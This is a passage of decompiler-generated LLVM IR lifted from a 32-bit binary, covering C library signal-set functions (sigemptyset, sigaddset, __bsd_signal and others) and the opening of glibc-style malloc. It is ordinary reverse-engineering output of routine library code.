  br i1 %v5_805ff3e, label %dec_label_pc_805ff48, label %dec_label_pc_805ff40

dec_label_pc_805ff40:                             ; preds = %dec_label_pc_805ff3b
  %v0_805ff43 = call i32 @__sigdelset()
  br label %dec_label_pc_805ff48

dec_label_pc_805ff48:                             ; preds = %dec_label_pc_805ff3b, %entry, %dec_label_pc_805ff40
  %v1_805ff48 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_805ff4d = inttoptr i32 %v1_805ff48 to i32*
  store i32 22, i32* %v1_805ff4d, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_805ff3b, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805ff48, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805ff6a = inttoptr i32 %arg1 to i8*
  %v4_805ff6a = call i32 @__GI_memset(i8* %v3_805ff6a, i32 0, i32 128)
  ret i32 0
}

define i32 @sigfillset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805ff89 = inttoptr i32 %arg1 to i8*
  %v4_805ff89 = call i32 @__GI_memset(i8* %v3_805ff89, i32 255, i32 128)
  ret i32 0
}

define i32 @sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_805ffac, label %dec_label_pc_805ff9f

dec_label_pc_805ff9f:                             ; preds = %entry
  %v1_805ff9f = add i32 %arg1, -64
  %v3_805ff9f = sub i32 63, %arg1
  %v4_805ff9f = and i32 %v3_805ff9f, %arg1
  %v5_805ff9f = icmp slt i32 %v4_805ff9f, 0
  %v6_805ff9f = icmp eq i32 %v1_805ff9f, 0
  %v7_805ff9f = icmp slt i32 %v1_805ff9f, 0
  %v3_805ffa2 = icmp eq i1 %v7_805ff9f, %v5_805ff9f
  %v4_805ffa2 = icmp eq i1 %v6_805ff9f, false
  %v5_805ffa2 = and i1 %v4_805ffa2, %v3_805ffa2
  br i1 %v5_805ffa2, label %dec_label_pc_805ffac, label %dec_label_pc_805ffa4

dec_label_pc_805ffa4:                             ; preds = %dec_label_pc_805ff9f
  %v4_805ffa7 = call i32 @__sigismember(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_805ffac

dec_label_pc_805ffac:                             ; preds = %dec_label_pc_805ff9f, %entry, %dec_label_pc_805ffa4
  %v1_805ffac = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_805ffb1 = inttoptr i32 %v1_805ffac to i32*
  store i32 22, i32* %v1_805ffb1, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_805ff9f, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805ffac, { 2, 0, 1 }
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v0_805ffc0 = load i32, i32* @ebx, align 4
  %v4_805ffc4 = icmp eq i32 %tmp2, 0
  store i32 %tmp, i32* @ebx, align 4
  br i1 %v4_805ffc4, label %dec_label_pc_805ffe9, label %dec_label_pc_805ffcf

dec_label_pc_805ffcf:                             ; preds = %entry
  %v1_805ffd0 = add i32 %tmp, 28
  %v4_805ffd8 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* null, i32 %v1_805ffd0)
  %v1_805ffe5 = icmp eq i32 %v4_805ffd8, 0
  br i1 %v1_805ffe5, label %dec_label_pc_805ffeb, label %dec_label_pc_805ffe9

dec_label_pc_805ffe9:                             ; preds = %dec_label_pc_805ffcf, %entry
  br label %dec_label_pc_805ffeb

dec_label_pc_805ffeb:                             ; preds = %dec_label_pc_805ffcf, %dec_label_pc_805ffe9
  %v0_805ffeb = phi i32 [ 1, %dec_label_pc_805ffcf ], [ 0, %dec_label_pc_805ffe9 ]
  %v1_805ffeb = load i32, i32* @ebx, align 4
  %v2_805ffeb = add i32 %v1_805ffeb, 24
  %v3_805ffeb = inttoptr i32 %v2_805ffeb to i32*
  store i32 %v0_805ffeb, i32* %v3_805ffeb, align 4
  store i32 %v0_805ffc0, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_805ffeb, { 1, 0 }
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_805fff4 = load i32, i32* @ebx, align 4
  %v15_805fff5 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_8060009 = icmp eq i32 %arg2, -1
  br i1 %v10_8060009, label %dec_label_pc_8060017, label %dec_label_pc_806000e

dec_label_pc_806000e:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_8060017, label %dec_label_pc_8060012

dec_label_pc_8060012:                             ; preds = %dec_label_pc_806000e
  %v7_8060015 = icmp sgt i32 %arg1, 64
  br i1 %v7_8060015, label %dec_label_pc_8060017, label %dec_label_pc_8060024

dec_label_pc_8060017:                             ; preds = %dec_label_pc_8060012, %dec_label_pc_806000e, %entry
  %v1_8060017 = call i32 @__errno_location(i32 %v0_805fff4)
  store i32 %v1_8060017, i32* %eax.global-to-local, align 4
  %v1_806001c = inttoptr i32 %v1_8060017 to i32*
  store i32 22, i32* %v1_806001c, align 4
  br label %dec_label_pc_8060098

dec_label_pc_8060024:                             ; preds = %dec_label_pc_8060012
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060032

dec_label_pc_8060032:                             ; preds = %dec_label_pc_8060032.dec_label_pc_8060032_crit_edge, %dec_label_pc_8060024
  %v0_8060032 = phi i32 [ %v15_805fff5, %dec_label_pc_8060024 ], [ %v0_8060032.pre, %dec_label_pc_8060032.dec_label_pc_8060032_crit_edge ]
  %v1_806003d17 = phi i32 [ 31, %dec_label_pc_8060024 ], [ %v1_806003d, %dec_label_pc_8060032.dec_label_pc_8060032_crit_edge ]
  %v2_8060032 = mul i32 %v1_806003d17, 4
  %v3_8060032 = add i32 %v2_8060032, 160
  %v4_8060032 = add i32 %v3_8060032, %v0_8060032
  %v5_8060032 = inttoptr i32 %v4_8060032 to i32*
  store i32 0, i32* %v5_8060032, align 4
  %v0_806003d.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_806003d = add i32 %v0_806003d.pre, -1
  %v9_806003d = icmp slt i32 %v1_806003d, 0
  store i32 %v1_806003d, i32* %eax.global-to-local, align 4
  %v1_806003e = icmp eq i1 %v9_806003d, false
  br i1 %v1_806003e, label %dec_label_pc_8060032.dec_label_pc_8060032_crit_edge, label %dec_label_pc_8060040

dec_label_pc_8060032.dec_label_pc_8060032_crit_edge: ; preds = %dec_label_pc_8060032
  %v0_8060032.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8060032

dec_label_pc_8060040:                             ; preds = %dec_label_pc_8060032
  %v0_8060040 = load i32, i32* @edx, align 4
  %v2_8060043 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_8060043, i32* %eax.global-to-local, align 4
  %v4_806004b = call i32 @__sigaddset(i32 %v2_8060043, i32 %arg1, i32 %v0_8060040, i32 %v0_8060040)
  store i32 %v4_806004b, i32* %eax.global-to-local, align 4
  %v2_8060053 = icmp slt i32 %v4_806004b, 0
  br i1 %v2_8060053, label %dec_label_pc_8060098, label %dec_label_pc_8060057

dec_label_pc_8060057:                             ; preds = %dec_label_pc_8060040
  %v4_806005f = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_807f380.680 to i32), i32 %arg1, i32 %v4_806004b, i32 %v4_806004b)
  %v2_8060078 = ptrtoint i32* %stack_var_-284 to i32
  %v2_806007d = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_806007d, i32* %eax.global-to-local, align 4
  %v4_8060086 = call i32 @__GI_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_8060078)
  store i32 %v4_8060086, i32* %eax.global-to-local, align 4
  %v2_806008e = icmp slt i32 %v4_8060086, 0
  br i1 %v2_806008e, label %dec_label_pc_8060098, label %dec_label_pc_8060092

dec_label_pc_8060092:                             ; preds = %dec_label_pc_8060057
  %v3_8060092 = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_806009b

dec_label_pc_8060098:                             ; preds = %dec_label_pc_8060057, %dec_label_pc_8060040, %dec_label_pc_8060017
  br label %dec_label_pc_806009b

dec_label_pc_806009b:                             ; preds = %dec_label_pc_8060092, %dec_label_pc_8060098
  %storemerge = phi i32 [ -1, %dec_label_pc_8060098 ], [ %v3_8060092, %dec_label_pc_8060092 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805fff4, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_806003d, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 8, 9, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 0, 5 }
  uselistorder label %dec_label_pc_806009b, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_80600b2 = add i32 %arg2, -1
  %v1_80600b5 = urem i32 %v1_80600b2, 32
  %v2_80600b5 = icmp eq i32 %v1_80600b5, 0
  store i32 %v1_80600b5, i32* @ecx, align 4
  %v2_80600b8 = udiv i32 %v1_80600b2, 32
  br i1 %v2_80600b5, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_80600bb = shl i32 1, %v1_80600b5
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_80600bd = phi i32 [ 1, %entry ], [ %v5_80600bb, %bb ]
  %v2_80600bd = mul nuw nsw i32 %v2_80600b8, 4
  %v3_80600bd = add i32 %v2_80600bd, %arg1
  %v4_80600bd = inttoptr i32 %v3_80600bd to i32*
  %v5_80600bd = load i32, i32* %v4_80600bd, align 4
  %v7_80600bd = and i32 %v5_80600bd, %v6_80600bd
  %v8_80600bd = icmp eq i32 %v7_80600bd, 0
  %v1_80600c1 = icmp eq i1 %v8_80600bd, false
  %v2_80600c1 = zext i1 %v1_80600c1 to i32
  ret i32 %v2_80600c1

; uselistorder directives
  uselistorder i32 %v1_80600b5, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80600c8 = load i32, i32* @ebx, align 4
  store i32 %v0_80600c8, i32* %stack_var_-4, align 4
  %v1_80600d6 = add i32 %arg2, -1
  %v1_80600d9 = urem i32 %v1_80600d6, 32
  %v2_80600d9 = icmp eq i32 %v1_80600d9, 0
  store i32 %v1_80600d9, i32* @ecx, align 4
  br i1 %v2_80600d9, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v5_80600dc = shl i32 1, %v1_80600d9
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_80600e1 = phi i32 [ 1, %entry ], [ %v5_80600dc, %bb ]
  %v2_80600de = udiv i32 %v1_80600d6, 32
  store i32 %v2_80600de, i32* @edx, align 4
  %v2_80600e1 = mul nuw nsw i32 %v2_80600de, 4
  %v3_80600e1 = add i32 %v2_80600e1, %arg1
  %v4_80600e1 = inttoptr i32 %v3_80600e1 to i32*
  %v5_80600e1 = load i32, i32* %v4_80600e1, align 4
  %v7_80600e1 = or i32 %v5_80600e1, %v6_80600e1
  store i32 %v7_80600e1, i32* %v4_80600e1, align 4
  %v2_80600e6 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80600e6, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_80600de, { 1, 0 }
  uselistorder i32 %v1_80600d9, { 2, 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__sigdelset() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80600e8 = load i32, i32* @ebx, align 4
  store i32 %v0_80600e8, i32* %stack_var_-4, align 4
  %v1_80600f6 = add i32 %tmp3, -1
  %v1_80600f9 = urem i32 %v1_80600f6, 32
  %v2_80600f9 = icmp eq i32 %v1_80600f9, 0
  br i1 %v2_80600f9, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v4_80600fc = shl i32 -2, %v1_80600f9
  %v5_80600fc = sub nsw i32 32, %v1_80600f9
  %v6_80600fc = lshr i32 -2, %v5_80600fc
  %v7_80600fc = or i32 %v6_80600fc, %v4_80600fc
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_8060101 = phi i32 [ -2, %entry ], [ %v7_80600fc, %bb ]
  %v2_80600fe = udiv i32 %v1_80600f6, 32
  %v2_8060101 = mul nuw nsw i32 %v2_80600fe, 4
  %v3_8060101 = add i32 %v2_8060101, %tmp
  %v4_8060101 = inttoptr i32 %v3_8060101 to i32*
  %v5_8060101 = load i32, i32* %v4_8060101, align 4
  %v7_8060101 = and i32 %v5_8060101, %v6_8060101
  store i32 %v7_8060101, i32* %v4_8060101, align 4
  %v2_8060106 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8060106, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_80600f9, { 1, 2, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_8060108 = load i32, i32* @eax, align 4
  %v6_806011b = icmp ugt i32 %v0_8060108, 16777215
  br i1 %v6_806011b, label %dec_label_pc_806012c, label %dec_label_pc_806011d

dec_label_pc_806011d:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_8060108, 256
  %v2_806010a = udiv i32 %v0_8060108, 256
  %v2_806011d = call i32 @llvm.ctlz.i32(i32 %v2_806010a, i1 true)
  %v3_806011d = xor i32 %v2_806011d, 31
  %v5_806011d = select i1 %tmp, i32 95, i32 %v3_806011d
  %v1_8060120 = add nuw nsw i32 %v5_806011d, 6
  store i32 %v1_8060120, i32* @ecx, align 4
  %v2_8060123 = urem i32 %v1_8060120, 32
  %v4_8060123 = icmp eq i32 %v2_8060123, 0
  br i1 %v4_8060123, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_806011d
  %v5_8060123 = lshr i32 %v0_8060108, %v2_8060123
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_806011d, %bb
  %v0_8060125 = phi i32 [ %v0_8060108, %dec_label_pc_806011d ], [ %v5_8060123, %bb ]
  %v1_8060125 = urem i32 %v0_8060125, 4
  %v2_8060128 = mul nuw nsw i32 %v5_806011d, 4
  %v3_8060128 = or i32 %v1_8060125, 32
  %v4_8060128 = add nuw nsw i32 %v3_8060128, %v2_8060128
  br label %dec_label_pc_806012c

dec_label_pc_806012c:                             ; preds = %entry, %bb4
  %v0_806012d = phi i32 [ 95, %entry ], [ %v4_8060128, %bb4 ]
  ret i32 %v0_806012d

; uselistorder directives
  uselistorder i32 %v2_8060123, { 1, 0 }
  uselistorder i32 %v0_8060108, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_806012c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_806012e = load i32, i32* @ebp, align 4
  %v0_806012f = load i32, i32* @edi, align 4
  %v0_8060130 = load i32, i32* @esi, align 4
  %v0_8060131 = load i32, i32* @ebx, align 4
  store i32 %v0_8060131, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8060143 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8060143, i32* %eax.global-to-local, align 4
  store i32 %v2_8060143, i32* %stack_var_-92, align 4
  %v4_8060148 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134589241, i32 ptrtoint (i32* @global_var_8075530.598 to i32))
  store i32 %v4_8060148, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8075530.598 to i32), i32* %stack_var_-92, align 4
  %v1_8060154 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075530.598 to i32))
  store i32 %v1_8060154, i32* %eax.global-to-local, align 4
  %v0_806015c = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_806015c, -32
  br i1 %tmp, label %dec_label_pc_8060173, label %dec_label_pc_8060161

dec_label_pc_8060161:                             ; preds = %entry
  %v0_8060161 = load i32, i32* %stack_var_-92, align 4
  %v1_8060161 = call i32 @__errno_location(i32 %v0_8060161)
  store i32 %v1_8060161, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8060168 = inttoptr i32 %v1_8060161 to i32*
  store i32 12, i32* %v1_8060168, align 4
  br label %dec_label_pc_80608c6

dec_label_pc_8060173:                             ; preds = %entry
  %v1_8060173 = add i32 %v0_806015c, 11
  %tmp136 = icmp ult i32 %v1_8060173, 16
  br i1 %tmp136, label %dec_label_pc_806018a, label %dec_label_pc_8060183

dec_label_pc_8060183:                             ; preds = %dec_label_pc_8060173
  %v1_8060183 = and i32 %v1_8060173, -8
  br label %dec_label_pc_806018a

dec_label_pc_806018a:                             ; preds = %dec_label_pc_8060173, %dec_label_pc_8060183
  %storemerge133 = phi i32 [ %v1_8060183, %dec_label_pc_8060183 ], [ %v1_8060173, %dec_label_pc_8060173 ]
  %v1_806052a = phi i32 [ %v1_8060183, %dec_label_pc_8060183 ], [ 16, %dec_label_pc_8060173 ]
  store i32 %storemerge133, i32* %eax.global-to-local, align 4
  %v0_806018a = load i8, i8* @global_var_807f400.681, align 1
  %v1_806018a = sext i8 %v0_806018a to i32
  store i32 %v1_806018a, i32* @ebx, align 4
  %v3_8060190 = urem i8 %v0_806018a, 2
  %v4_8060190 = icmp eq i8 %v3_8060190, 0
  %v1_8060193 = icmp eq i1 %v4_8060190, false
  br i1 %v1_8060193, label %dec_label_pc_80601b2, label %dec_label_pc_8060195

dec_label_pc_8060195:                             ; preds = %dec_label_pc_806018a
  %v2_8060195 = icmp eq i8 %v0_806018a, 0
  %v1_8060197 = icmp eq i1 %v2_8060195, false
  br i1 %v1_8060197, label %dec_label_pc_8060495, label %dec_label_pc_806019d

dec_label_pc_806019d:                             ; preds = %dec_label_pc_8060195
  store i32 ptrtoint (i8* @global_var_807f400.681 to i32), i32* %stack_var_-92, align 4
  %v2_80601a5 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_807f400.681 to i32*))
  store i32 %v2_80601a5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060495

dec_label_pc_80601b2:                             ; preds = %dec_label_pc_806018a
  %v11_80601b2 = trunc i32 %v1_806052a to i8
  %v8_80601b6 = icmp ugt i8 %v11_80601b2, %v0_806018a
  br i1 %v8_80601b6, label %dec_label_pc_80601d3, label %dec_label_pc_80601b8

dec_label_pc_80601b8:                             ; preds = %dec_label_pc_80601b2
  %v2_80601bc = udiv i32 %v1_806052a, 2
  store i32 %v2_80601bc, i32* %eax.global-to-local, align 4
  %v1_80601be = add i32 %v2_80601bc, ptrtoint (i8* @global_var_807f400.681 to i32)
  store i32 %v1_80601be, i32* @ecx, align 4
  %v1_80601c4 = add i32 %v2_80601bc, add (i32 ptrtoint (i8* @global_var_807f400.681 to i32), i32 -4)
  %v2_80601c4 = inttoptr i32 %v1_80601c4 to i32*
  %v3_80601c4 = load i32, i32* %v2_80601c4, align 4
  store i32 %v3_80601c4, i32* %edx.global-to-local, align 4
  %v1_80601c7 = icmp eq i32 %v3_80601c4, 0
  br i1 %v1_80601c7, label %dec_label_pc_80601d3, label %dec_label_pc_80601cb

dec_label_pc_80601cb:                             ; preds = %dec_label_pc_80601b8
  %v1_80601cb = add i32 %v3_80601c4, 8
  %v2_80601cb = inttoptr i32 %v1_80601cb to i32*
  %v3_80601cb = load i32, i32* %v2_80601cb, align 4
  store i32 %v3_80601cb, i32* %eax.global-to-local, align 4
  store i32 %v3_80601cb, i32* %v2_80601c4, align 4
  br label %dec_label_pc_806020c

dec_label_pc_80601d3:                             ; preds = %dec_label_pc_80601b8, %dec_label_pc_80601b2
  %v8_80601d3 = icmp ult i32 %v1_806052a, 255
  %v6_80601db = icmp ugt i32 %v1_806052a, 255
  store i32 %v1_806052a, i32* @eax, align 4
  br i1 %v6_80601db, label %dec_label_pc_8060214, label %dec_label_pc_80601dd

dec_label_pc_80601dd:                             ; preds = %dec_label_pc_80601d3
  %v2_80601e1 = udiv i32 %v1_806052a, 8
  store i32 %v2_80601e1, i32* %eax.global-to-local, align 4
  %v1_80601e4 = mul nuw i32 %v2_80601e1, 8
  %v2_80601e4 = add i32 %v1_80601e4, ptrtoint (i32* @global_var_807f42c.682 to i32)
  store i32 %v2_80601e4, i32* @ecx, align 4
  %v1_80601ef = add i32 %v1_80601e4, add (i32 ptrtoint (i32* @global_var_807f42c.682 to i32), i32 12)
  %v2_80601ef = inttoptr i32 %v1_80601ef to i32*
  %v3_80601ef = load i32, i32* %v2_80601ef, align 4
  store i32 %v3_80601ef, i32* %edx.global-to-local, align 4
  %v12_80601f2 = icmp eq i32 %v3_80601ef, %v2_80601e4
  br i1 %v12_80601f2, label %dec_label_pc_8060310.preheader, label %dec_label_pc_80601fa

dec_label_pc_80601fa:                             ; preds = %dec_label_pc_80601dd
  store i32 %v1_806052a, i32* %ebx.global-to-local, align 4
  %v1_80601fe = add i32 %v3_80601ef, 12
  %v2_80601fe = inttoptr i32 %v1_80601fe to i32*
  %v3_80601fe = load i32, i32* %v2_80601fe, align 4
  store i32 %v3_80601fe, i32* %eax.global-to-local, align 4
  %v2_8060201 = or i32 %v1_806052a, 4
  %v3_8060201 = add i32 %v3_80601ef, %v2_8060201
  %v4_8060201 = inttoptr i32 %v3_8060201 to i32*
  %v5_8060201 = load i32, i32* %v4_8060201, align 4
  %v6_8060201 = or i32 %v5_8060201, 1
  store i32 %v6_8060201, i32* %v4_8060201, align 4
  %v0_8060206 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060206 = load i32, i32* @ecx, align 4
  %v2_8060206 = add i32 %v1_8060206, 12
  %v3_8060206 = inttoptr i32 %v2_8060206 to i32*
  store i32 %v0_8060206, i32* %v3_8060206, align 4
  %v0_8060209 = load i32, i32* @ecx, align 4
  %v1_8060209 = load i32, i32* %eax.global-to-local, align 4
  %v2_8060209 = add i32 %v1_8060209, 8
  %v3_8060209 = inttoptr i32 %v2_8060209 to i32*
  store i32 %v0_8060209, i32* %v3_8060209, align 4
  br label %dec_label_pc_806020c

dec_label_pc_806020c:                             ; preds = %dec_label_pc_80601cb, %dec_label_pc_80601fa
  %v0_806020c = load i32, i32* %edx.global-to-local, align 4
  %v1_806020c = add i32 %v0_806020c, 8
  store i32 %v1_806020c, i32* @ebx, align 4
  br label %dec_label_pc_80608b5

dec_label_pc_8060214:                             ; preds = %dec_label_pc_80601d3
  %v0_8060218 = call i32 @__malloc_largebin_index()
  store i32 %v0_8060218, i32* %eax.global-to-local, align 4
  %v3_806021d = and i8 %v0_806018a, 2
  %v4_806021d = icmp eq i8 %v3_806021d, 0
  br i1 %v4_806021d, label %dec_label_pc_8060310.preheader, label %dec_label_pc_806022a

dec_label_pc_806022a:                             ; preds = %dec_label_pc_8060214
  store i32 ptrtoint (i8* @global_var_807f400.681 to i32), i32* %stack_var_-92, align 4
  %v2_8060232 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_807f400.681 to i32*))
  store i32 %v2_8060232, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060310.preheader

dec_label_pc_8060310.preheader:                   ; preds = %dec_label_pc_806022a, %dec_label_pc_80601dd, %dec_label_pc_8060214
  %stack_var_-40.0.ph = phi i32 [ %v2_80601e1, %dec_label_pc_80601dd ], [ %v0_8060218, %dec_label_pc_806022a ], [ %v0_8060218, %dec_label_pc_8060214 ]
  %v1_8060266 = add i32 %v1_806052a, 16
  %v0_8060310109 = load i32, i32* @global_var_807f440.685, align 64
  store i32 %v0_8060310109, i32* @ebp, align 4
  %v9_8060316115 = icmp eq i32 %v0_8060310109, 134738996
  %v1_806031c117 = icmp eq i1 %v9_8060316115, false
  br i1 %v1_806031c117, label %dec_label_pc_806023f, label %dec_label_pc_8060322

dec_label_pc_806023f:                             ; preds = %dec_label_pc_8060310.preheader, %bb82
  %v0_8060310118 = phi i32 [ %v0_8060310, %bb82 ], [ %v0_8060310109, %dec_label_pc_8060310.preheader ]
  %v1_806023f = add i32 %v0_8060310118, 4
  %v2_806023f = inttoptr i32 %v1_806023f to i32*
  %v3_806023f = load i32, i32* %v2_806023f, align 4
  %v1_8060242 = add i32 %v0_8060310118, 12
  %v2_8060242 = inttoptr i32 %v1_8060242 to i32*
  %v3_8060242 = load i32, i32* %v2_8060242, align 4
  store i32 %v3_8060242, i32* %edx.global-to-local, align 4
  %v1_8060245 = and i32 %v3_806023f, -4
  store i32 %v1_8060245, i32* @edi, align 4
  br i1 %v6_80601db, label %dec_label_pc_8060271, label %dec_label_pc_8060252

dec_label_pc_8060252:                             ; preds = %dec_label_pc_806023f
  %v9_8060252 = icmp eq i32 %v3_8060242, 134738996
  %v1_8060258 = icmp eq i1 %v9_8060252, false
  br i1 %v1_8060258, label %dec_label_pc_8060271, label %dec_label_pc_806025a

dec_label_pc_806025a:                             ; preds = %dec_label_pc_8060252
  %v1_806025a = load i32, i32* @global_var_807f430.683, align 16
  %v12_806025a = icmp eq i32 %v0_8060310118, %v1_806025a
  %v1_8060260 = icmp eq i1 %v12_806025a, false
  br i1 %v1_8060260, label %dec_label_pc_8060271, label %dec_label_pc_8060262

dec_label_pc_8060262:                             ; preds = %dec_label_pc_806025a
  store i32 %v1_8060266, i32* %eax.global-to-local, align 4
  %v6_806026b = icmp ugt i32 %v1_8060245, %v1_8060266
  br i1 %v6_806026b, label %dec_label_pc_8060850, label %dec_label_pc_8060271

dec_label_pc_8060271:                             ; preds = %dec_label_pc_8060262, %dec_label_pc_806025a, %dec_label_pc_8060252, %dec_label_pc_806023f
  store i32 ptrtoint (i32* @global_var_807f434.684 to i32), i32* %eax.global-to-local, align 4
  store i32 %v3_8060242, i32* @global_var_807f440.685, align 4
  %v2_8060279 = add i32 %v3_8060242, 8
  %v3_8060279 = inttoptr i32 %v2_8060279 to i32*
  store i32 ptrtoint (i32* @global_var_807f434.684 to i32), i32* %v3_8060279, align 4
  %v0_806027c = load i32, i32* @edi, align 4
  %v15_806027c = icmp eq i32 %v0_806027c, %v1_806052a
  br i1 %v15_806027c, label %dec_label_pc_8060891, label %dec_label_pc_8060286

dec_label_pc_8060286:                             ; preds = %dec_label_pc_8060271
  %v6_806028c = icmp ugt i32 %v0_806027c, 255
  br i1 %v6_806028c, label %dec_label_pc_806029f, label %dec_label_pc_806028e

dec_label_pc_806028e:                             ; preds = %dec_label_pc_8060286
  %v2_8060290 = udiv i32 %v0_806027c, 8
  store i32 %v2_8060290, i32* %esi.global-to-local, align 4
  %v1_8060293 = mul nuw i32 %v2_8060290, 8
  %v2_8060293 = add i32 %v1_8060293, 134738988
  store i32 %v2_8060293, i32* @ebx, align 4
  %v1_806029a = add i32 %v1_8060293, 134738996
  %v2_806029a = inttoptr i32 %v1_806029a to i32*
  %v3_806029a = load i32, i32* %v2_806029a, align 4
  store i32 %v3_806029a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80602e8

dec_label_pc_806029f:                             ; preds = %dec_label_pc_8060286
  store i32 %v0_806027c, i32* @eax, align 4
  %v0_80602a1 = call i32 @__malloc_largebin_index()
  store i32 %v0_80602a1, i32* %esi.global-to-local, align 4
  %v1_80602a8 = mul i32 %v0_80602a1, 8
  %v2_80602a8 = add i32 %v1_80602a8, ptrtoint (i32* @global_var_807f42c.682 to i32)
  store i32 %v2_80602a8, i32* %eax.global-to-local, align 4
  %v1_80602af = add i32 %v1_80602a8, add (i32 ptrtoint (i32* @global_var_807f42c.682 to i32), i32 8)
  %v2_80602af = inttoptr i32 %v1_80602af to i32*
  %v3_80602af = load i32, i32* %v2_80602af, align 4
  store i32 %v3_80602af, i32* %edx.global-to-local, align 4
  %v12_80602b2 = icmp eq i32 %v3_80602af, %v2_80602a8
  store i32 %v3_80602af, i32* @ebx, align 4
  br i1 %v12_80602b2, label %dec_label_pc_80602e8, label %dec_label_pc_80602bc

dec_label_pc_80602bc:                             ; preds = %dec_label_pc_806029f
  %v1_80602bc = add i32 %v1_80602a8, add (i32 ptrtoint (i32* @global_var_807f42c.682 to i32), i32 12)
  %v2_80602bc = inttoptr i32 %v1_80602bc to i32*
